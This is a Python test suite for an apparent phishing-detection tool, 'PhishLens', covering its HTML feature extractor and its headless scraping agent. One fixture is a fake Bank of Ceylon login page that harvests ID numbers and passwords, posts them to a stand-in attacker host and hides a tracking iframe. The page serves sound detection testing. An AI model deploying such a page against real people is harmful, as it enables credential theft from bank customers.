"""
PhishLens Agent — Test Suite for HTML/DOM Feature Extraction Agent and Headless Web Scraping Agent.
"""

import json
import asyncio
from unittest.mock import patch, MagicMock, AsyncMock
import pytest

from backend.agents.html_dom_agent import (
    extract_html_features,
    SUSPICIOUS_KEYWORDS,
    KNOWN_BRANDS,
)
from backend.agents.web_scraping_agent import WebScrapingAgent
from backend.agents.base_agent import AgentStatus


# ===========================================================================
# 1. HTML/DOM Feature Extractor Tests
# ===========================================================================

class TestHTMLDOMAgent:
    def test_phishing_page_dom_extraction(self):
        """Extract indicators from malicious credential harvesting HTML."""
        phishing_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Bank of Ceylon - Secure Online Banking Login</title>
            <link rel="icon" href="https://external-cdn.xyz/favicon.ico">
        </head>
        <body>
            <h1>Welcome to BOC Internet Banking</h1>
            <p>Please enter your National Identity Card (NIC) number and OTP to verify your account.</p>
            <form action="https://attacker-collect-stealer.xyz/harvest" method="POST">
                <input type="text" name="nic_number" placeholder="Enter NIC Number">
                <input type="password" name="password" placeholder="Enter Password">
                <input type="hidden" name="stealer_id" value="camp_42">
                <button type="submit">Verify Now</button>
            </form>
            <iframe src="https://silent-tracker.xyz/log" style="display: none;"></iframe>
            <a href="#">Terms</a>
            <a href="javascript:void(0)">Help</a>
            <a href="https://external-link-1.com">External 1</a>
            <a href="https://external-link-2.com">External 2</a>
        </body>
        </html>
        """

        with patch("requests.get") as mock_get:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.text = phishing_html
            mock_resp.raise_for_status.return_value = None
            mock_get.return_value = mock_resp

            res_str = extract_html_features.invoke({"url": "https://boc-fake-login.xyz"})
            res = json.loads(res_str)

            assert res["status"] == "success"
            assert res["page_title"] == "Bank of Ceylon - Secure Online Banking Login"

            # Form checks
            forms = res["forms"]
            assert forms["count"] == 1
            assert forms["details"][0]["action_is_external"] is True

            # Input fields
            inputs = res["input_fields"]
            assert inputs["password_fields"] == 1
            assert inputs["hidden_fields"] == 1

            # Links and iframes
            assert res["links"]["null_or_dead"] == 2
            assert res["iframes"]["count"] == 1
            assert res["favicon"]["is_external"] is True

            # Keywords and brands
            assert any("boc" in b.lower() or "bank of ceylon" in b.lower() for b in res["brand_mentions_in_text"])
            assert any("nic" in k.lower() or "otp" in k.lower() or "password" in k.lower() for k in res["suspicious_keywords_found"])

            # 12-D DOM Feature Vector
            dom_vector = res["dom_feature_vector"]
            assert len(dom_vector) == 12
            for val in dom_vector:
                assert isinstance(val, (int, float))
                assert 0.0 <= val <= 1.0

            # Password field flag (index 1) and external form action flag (index 4)
            assert dom_vector[1] == 1.0
            assert dom_vector[4] == 1.0

    def test_benign_page_dom_extraction(self):
        """Extract indicators from clean legitimate HTML page."""
        benign_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Official Bank Website</title>
            <link rel="icon" href="/favicon.ico">
        </head>
        <body>
            <h1>About Us</h1>
            <p>Welcome to our authentic financial institution.</p>
            <form action="/search" method="GET">
                <input type="text" name="q" placeholder="Search site...">
                <button type="submit">Search</button>
            </form>
            <a href="/personal">Personal Banking</a>
            <a href="/business">Business Banking</a>
            <a href="/contact">Contact</a>
        </body>
        </html>
        """

        with patch("requests.get") as mock_get:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.text = benign_html
            mock_resp.raise_for_status.return_value = None
            mock_get.return_value = mock_resp

            res_str = extract_html_features.invoke({"url": "https://officialbank.lk"})
            res = json.loads(res_str)

            assert res["status"] == "success"
            assert res["input_fields"]["password_fields"] == 0
            assert res["forms"]["details"][0]["action_is_external"] is False
            assert res["favicon"]["is_external"] is False
            assert res["dom_feature_vector"][1] == 0.0  # password_field_flag
            assert res["dom_feature_vector"][4] == 0.0  # external_form_action_flag

    def test_html_extraction_network_failure(self):
        """Tool returns error status when request fails."""
        with patch("requests.get", side_effect=Exception("Connection refused")):
            res_str = extract_html_features.invoke({"url": "https://offline-target.com"})
            res = json.loads(res_str)
            assert res["status"] == "error"
            assert "Connection refused" in res["error"]


# ===========================================================================
# 2. Web Scraping Agent Tests
# ===========================================================================

class TestWebScrapingAgent:
    def test_web_scraping_agent_mock_run(self):
        """Test WebScrapingAgent execution with mocked Playwright browser."""
        agent = WebScrapingAgent()
        assert agent.name == "WebScrapingAgent"

        # Mock playwright context manager
        mock_page = AsyncMock()
        mock_page.title.return_value = "Scraped Page Title"
        mock_page.screenshot.return_value = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"

        mock_context = AsyncMock()
        mock_context.new_page.return_value = mock_page

        mock_browser = AsyncMock()
        mock_browser.new_context.return_value = mock_context

        mock_playwright = AsyncMock()
        mock_playwright.chromium.launch.return_value = mock_browser

        with patch("backend.agents.web_scraping_agent.async_playwright") as mock_pw_func:
            mock_pw_func.return_value.__aenter__.return_value = mock_playwright

            result = asyncio.run(agent.run("https://example.com"))
            assert result.status == AgentStatus.COMPLETED
            assert result.data["title"] == "Scraped Page Title"
            assert "screenshot_b64" in result.data
            assert len(result.data["screenshot_b64"]) > 0

    def test_web_scraping_agent_failure_handling(self):
        """Test WebScrapingAgent handles crashes gracefully."""
        agent = WebScrapingAgent()

        with patch("backend.agents.web_scraping_agent.async_playwright", side_effect=RuntimeError("Browser launch failed")):
            result = asyncio.run(agent.run("https://broken.com"))
            assert result.status == AgentStatus.FAILED
            assert "Browser launch failed" in result.error
